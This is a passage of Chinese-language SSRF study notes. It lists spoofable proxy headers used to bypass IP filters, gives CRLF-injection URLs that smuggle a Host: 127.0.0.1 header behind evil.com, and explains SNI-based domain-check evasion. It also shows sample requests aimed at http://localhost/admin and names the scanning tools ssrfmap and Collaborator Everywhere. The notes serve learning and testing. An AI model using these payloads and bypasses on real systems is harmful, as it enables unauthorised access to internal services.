   | `Via`                       | 表示请求经过哪些代理节点           | 有些服务根据此字段判定是否允许请求        | Varnish、Squid、CDN                  | 被伪造后混淆请求路径信息                                     |
   | `Client-IP`                 | 某些 PHP 后端通过该字段判断来源 IP | 可用于绕过白名单检查                      | PHP、旧版本 Laravel 等               | 可绕过 IP 黑名单限制                                         |
   | `Proxy`                     | 用于标示是否通过代理               | 旧服务可能依据此字段做逻辑控制            | 某些老旧代理服务                     | 可误导服务认为是内部请求                                     |
   | `X-Forwarded-Server`        | 表示最初接收到请求的服务器名       | 可配合其他字段欺骗负载均衡行为            | Load balancer                        | 控制转发行为可能导致 SSRF                                    |

1. CRLF间接导入请求头

   ```
   http://evil.com%0d%0aHost:%20127.0.0.1
   http://evil.com\r\nHost: 127.0.0.1
   ```

#### SNI绕过域名检测：

1. SNI的出现就是为了解决同一个IP下有多个域名的问题，这个字段决定了在DNS解析之后，到底访问的是这个IP的那个域名，因此SNI字段只能是域名
2. 有些服务器只检测URL、请求头，忽视了SNI，那么SNI换成hacker.com，即可绕过域名检测

## 三、实践总结

#### 注入点：

1. 不是url重定向处，但是利用url重定向

   ```
   GET /product/nextProduct?currentProductId=5&path=http://localhost/admin HTTP/2
   ```

   ```
   stockApi=%2Fproduct%2Fstock%2Fcheck%3FproductId%3D5%26storeId%3D1%26path%3D=http://localhost/admin
   ```

2. Collaborator everywhere 寻找注入点

#### 半自动化:

1. 观察是否存在url

2. 使用Collaborator everywhere，扫出隐性入口

   ![image-20250708111842291](C:\Users\33940\AppData\Roaming\Typora\typora-user-images\image-20250708111842291.png)

3. 使用ssrfmap扫
